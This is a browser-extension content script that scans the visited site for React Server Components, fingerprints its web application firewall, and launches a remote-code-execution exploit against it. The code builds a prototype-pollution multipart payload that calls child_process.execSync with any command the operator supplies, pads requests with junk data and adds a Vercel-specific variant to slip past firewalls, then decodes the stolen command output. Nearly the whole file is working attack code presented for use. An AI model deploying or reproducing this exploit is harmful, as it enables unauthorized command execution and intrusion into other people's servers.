// content.js

const DEFAULT_BOUNDARY = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
const DEFAULT_WAF_BYPASS_KB = 128;

const WAF_SIGNATURES = [
    {
        name: "Cloudflare",
        matchers: [
            { type: "header", header: "server", pattern: /cloudflare/i },
            { type: "header", header: "cf-ray" },
            { type: "header", header: "cf-cache-status" }
        ],
        bodyPatterns: [/cloudflare/i, /attention required/i]
    },
    {
        name: "AWS",
        matchers: [
            { type: "header", header: "x-amzn-requestid" },
            { type: "header", header: "x-amz-cf-id" },
            { type: "header", header: "x-amzn-trace-id" },
            { type: "header", header: "server", pattern: /awselb|amazon|cloudfront/i }
        ],
        bodyPatterns: [/aws waf/i, /request blocked/i]
    },
    {
        name: "Akamai",
        matchers: [
            { type: "header", header: "server", pattern: /akamai/i },
            { type: "header", header: "x-akamai-transformed" },
            { type: "header", header: "x-akamai-session-info" }
        ],
        bodyPatterns: [/akamai/i, /akamai technologies/i]
    },
    {
        name: "Fastly",
        matchers: [
            { type: "header", header: "x-served-by" },
            { type: "header", header: "x-cache", pattern: /fastly/i },
            { type: "header", header: "x-fastly-request-id" }
        ],
        bodyPatterns: [/fastly/i]
    },
    {
        name: "Imperva Incapsula",
        matchers: [
            { type: "header", header: "x-iinfo" },
            { type: "header", header: "x-cdn", pattern: /incapsula/i },
            { type: "header", header: "server", pattern: /incapsula/i }
        ],
        bodyPatterns: [/incapsula/i, /powered by imperva/i]
    },
    {
        name: "Sucuri",
        matchers: [
            { type: "header", header: "x-sucuri-id" },
            { type: "header", header: "x-sucuri-block" },
            { type: "header", header: "server", pattern: /sucuri|cloudproxy/i }
        ],
        bodyPatterns: [/access denied/i, /sucuri/i]
    },
    {
        name: "F5 BIG-IP",
        matchers: [
            { type: "header", header: "server", pattern: /big-ip|f5/i },
            { type: "header", header: "x-wa-info" },
            { type: "header", header: "x-cnection" }
        ],
        bodyPatterns: [/request rejected/i, /f5 networks/i]
    },
    {
        name: "Barracuda",
        matchers: [
            { type: "header", header: "server", pattern: /barracuda/i },
            { type: "header", header: "x-barracuda" },
            { type: "headerPattern", headerPattern: /x-barracuda-.*/i }
        ],
        bodyPatterns: [/barracuda/i]
    },
    {
        name: "Vercel",
        matchers: [
            { type: "header", header: "server", pattern: /vercel/i },
            { type: "header", header: "x-vercel-cache" },
            { type: "header", header: "x-vercel-id" }
        ],
        bodyPatterns: [/vercel/i]
    },
    {
        name: "Azure",
        matchers: [
            { type: "header", header: "server", pattern: /azure front door/i },
            { type: "header", header: "x-azure-ref" },
            { type: "header", header: "x-azure-fdid" }
        ],
        bodyPatterns: [/azure/i]
    },
    {
        name: "Google Cloud Armor",
        matchers: [
            { type: "header", header: "server", pattern: /google frontend/i },
            { type: "header", header: "x-cloud-trace-context" }
        ],
        bodyPatterns: [/cloud armor/i]
    }
];

const wafCache = { result: null, promise: null };

// Normalize header keys for case-insensitive matching.
function normalizeHeaders(headers) {
    const normalized = {};
    headers.forEach((value, key) => {
        normalized[key.toLowerCase()] = value;
    });
    return normalized;
}

// Match WAF signatures against headers and body content.
function matchesSignature(signature, headers, bodyText) {
    const evidence = [];

    signature.matchers.forEach((matcher) => {
        if (matcher.type === "header") {
            const headerKey = matcher.header.toLowerCase();
            const headerValue = headers[headerKey];

            if (!headerValue) return;
            if (matcher.pattern) {
                if (matcher.pattern.test(headerValue)) {
                    evidence.push(`Header ${matcher.header}: ${headerValue}`);
                }
                return;
            }

            evidence.push(`Header ${matcher.header}: ${headerValue}`);
        }

        if (matcher.type === "headerPattern") {
            const matchedKey = Object.keys(headers).find((key) => matcher.headerPattern.test(key));
            if (matchedKey) {
                evidence.push(`Header ${matchedKey}: ${headers[matchedKey]}`);
            }
        }
    });

    signature.bodyPatterns.forEach((pattern) => {
        if (pattern.test(bodyText)) {
            evidence.push(`Body matched: ${pattern.source}`);
        }
    });

    return evidence.length > 0 ? evidence : null;
}

// Detect common WAF signatures and cache results for this page.
async function detectWaf() {
    if (wafCache.result) return wafCache.result;
    if (wafCache.promise) return wafCache.promise;

    wafCache.promise = (async () => {
        try {
            const response = await fetch(window.location.href, {
                method: "GET",
                cache: "no-store",
                credentials: "same-origin"
            });

            const headers = normalizeHeaders(response.headers);
            const bodyText = (await response.text()).slice(0, 4096);
            const matches = [];

            WAF_SIGNATURES.forEach((signature) => {
                const evidence = matchesSignature(signature, headers, bodyText);
                if (evidence) {
                    matches.push({ name: signature.name, evidence });
                }
            });

            const result = {
                detected: matches.length > 0,
                matches,
                status: response.status,
                checkedUrl: response.url
            };
            wafCache.result = result;
            return result;
        } catch (error) {
            const result = {
                detected: false,
                matches: [],
                error: error.message || "WAF detection failed"
            };
            wafCache.result = result;
            return result;
        } finally {
            wafCache.promise = null;
        }
    })();

    return wafCache.promise;
}

// Escape single quotes and backslashes for payload safety.
function escapeCommand(command) {
    return command.replace(/\\/g, "\\\\").replace(/'/g, "\\'");
}

// Generate random ASCII data for padding.
function generateRandomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let output = "";

    while (output.length < length) {
        const remaining = length - output.length;
        const chunkSize = Math.min(1024, remaining);
        let chunk = "";

        for (let i = 0; i < chunkSize; i += 1) {
            chunk += chars[Math.floor(Math.random() * chars.length)];
        }
        output += chunk;
    }

    return output;
}

// Build a random parameter name and payload for padding.
function generateJunkData(sizeBytes) {
    const paramName = generateRandomString(12).toLowerCase();
    const junk = generateRandomString(sizeBytes);
    return { paramName, junk };
}

// Build the base payload JSON for the exploit body.
function buildBasePayload(command, formDataGetter) {
    const escapedCmd = escapeCommand(command);
    return `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${escapedCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"${formDataGetter}"}}}`;
}

// Build multipart form data body with optional padding and variants.
function buildMultipartBody({
    payloadJson,
    includeJunk,
    includeVercelBypass
}) {
    const parts = [];

    if (includeJunk) {
        const { paramName, junk } = generateJunkData(DEFAULT_WAF_BYPASS_KB * 1024);
        parts.push(
            `--${DEFAULT_BOUNDARY}\r\n` +
            `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
            `${junk}\r\n`
        );
    }

    parts.push(
        `--${DEFAULT_BOUNDARY}\r\n` +
        'Content-Disposition: form-data; name="0"\r\n\r\n' +
        `${payloadJson}\r\n`
    );

    parts.push(
        `--${DEFAULT_BOUNDARY}\r\n` +
        'Content-Disposition: form-data; name="1"\r\n\r\n' +
        '"$@0"\r\n'
    );

    parts.push(
        `--${DEFAULT_BOUNDARY}\r\n` +
        'Content-Disposition: form-data; name="2"\r\n\r\n' +
        '[]\r\n'
    );

    if (includeVercelBypass) {
        parts.push(
            `--${DEFAULT_BOUNDARY}\r\n` +
            'Content-Disposition: form-data; name="3"\r\n\r\n' +
            '{"\\"$$":{}}\r\n'
        );
    }

    parts.push(`--${DEFAULT_BOUNDARY}--`);

    return parts.join("");
}

// Build the exploit request body and content type.
function buildExploitPayload({ command, wafBypass, wafVendor }) {
    const includeJunk = Boolean(wafBypass);
    const useVercelBypass = wafBypass && wafVendor === "Vercel";
    const formDataGetter = useVercelBypass
        ? '$3:"$$:constructor:constructor"'
        : "$1:constructor:constructor";
    const payloadJson = buildBasePayload(command, formDataGetter);

    return {
        body: buildMultipartBody({
            payloadJson,
            includeJunk,
            includeVercelBypass: useVercelBypass
        }),
        contentType: `multipart/form-data; boundary=${DEFAULT_BOUNDARY}`
    };
}

// Passive scan for static indicators of RSC usage.
function performPassiveScan() {
    let score = 0;
    let details = [];
    const html = document.documentElement.outerHTML;

    if (document.contentType === "text/x-component") {
        score += 100;
        details.push("Found: Content-Type text/x-component");
    }
    if (/(window|self)\.__next_f\s*=/.test(html)) {
        score += 80;
        details.push("Found: window.__next_f (App Router)");
    }
    if (html.includes("react-server-dom-webpack")) {
        score += 30;
        details.push("Found: react-server-dom-webpack");
    }
    return { isRSC: score >= 50, details: details };
}

// Active fingerprint request to confirm RSC behavior.
async function performFingerprint() {
    try {
        const res = await fetch(window.location.href, {
            method: 'GET',
            headers: { 'RSC': '1' }
        });

        let details = [];
        const cType = res.headers.get('Content-Type') || "";
        const vary = res.headers.get('Vary') || "";
        const text = await res.text();

        if (cType.includes('text/x-component')) details.push("Response Content-Type became text/x-component");
        if (vary.includes('RSC')) details.push("Vary header contains 'RSC'");
        if (/^\d+:["IHL]/.test(text)) details.push("Body structure matches React Flight Protocol");

        return { detected: details.length > 0, details: details };
    } catch (e) {
        return { detected: false, details: ["Network Error"] };
    }
}

// Execute the exploit flow and decode the response output.
async function performExploit(cmd, options = {}) {
    const targetCmd = cmd || "echo vulnerability_test";
    const { wafBypass = false, wafVendor = null } = options;
    const { body, contentType } = buildExploitPayload({
        command: targetCmd,
        wafBypass,
        wafVendor
    });

    const targetUrl = "/qwerty";

    try {
        const res = await fetch(targetUrl, {
            method: 'POST',
            headers: {
                'Next-Action': 'x',
                'X-Nextjs-Request-Id': '1b3f9c1e',
                'X-Nextjs-Html-Request-ld': 'MuhammadUwais',
                'Content-Type': contentType,
                'X-Nextjs-Html-Request-Id': 'MuhammadUwais'
            },
            body: body
        });

        const responseText = await res.text();

        const digestMatch = responseText.match(/"digest"\s*:\s*"((?:[^"\\]|\\.)*)"/);

        if (digestMatch && digestMatch[1]) {
            let rawBase64 = digestMatch[1];

            try {
                let cleanBase64 = JSON.parse(`"${rawBase64}"`);

                const decodedStr = new TextDecoder().decode(
                    Uint8Array.from(atob(cleanBase64), c => c.charCodeAt(0))
                );

                return {
                    success: true,
                    output: decodedStr
                };
            } catch (parseError) {
                return {
                    success: false,
                    msg: "Decoding Error: " + parseError.message,
                    debug: rawBase64
                };
            }
        } else {
            return {
                success: false,
                msg: "Exploit Failed: 'digest' key not found.",
                debug: responseText.substring(0, 100)
            };
        }

    } catch (e) {
        return { success: false, msg: "Network/Request Error: " + e.message };
    }
}

// Initialize scan data and handle popup messages.
const passiveData = performPassiveScan();
if (passiveData.isRSC) chrome.runtime.sendMessage({ action: "update_badge" });

detectWaf();

chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
    if (req.action === "get_passive") sendResponse(passiveData);
    if (req.action === "run_fingerprint") {
        performFingerprint().then(res => sendResponse(res));
        return true;
    }
    if (req.action === "run_exploit") {
        performExploit(req.cmd, {
            wafBypass: Boolean(req.wafBypass),
            wafVendor: req.wafVendor
        }).then(res => sendResponse(res));
        return true;
    }
    if (req.action === "detect_waf") {
        detectWaf().then(res => sendResponse(res));
        return true;
    }
});
